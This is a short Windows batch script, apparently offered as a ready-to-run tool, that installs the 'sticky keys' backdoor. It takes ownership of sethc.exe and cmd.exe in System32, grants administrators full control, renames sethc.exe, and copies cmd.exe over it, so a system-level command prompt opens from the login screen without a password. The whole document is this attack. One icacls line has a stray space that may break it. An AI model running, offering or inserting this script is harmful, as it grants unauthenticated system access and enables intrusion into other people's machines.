@echo off
cd "C:\Windows\System32"
takeown /f sethc.exe
icacls sethc.exe /grant administrators: f
takeown /f cmd.exe
icacls cmd.exe /grant administrators: f
ren "sethc.exe" "sethcc.exe"
xcopy "cmd.exe" "sethc.exe"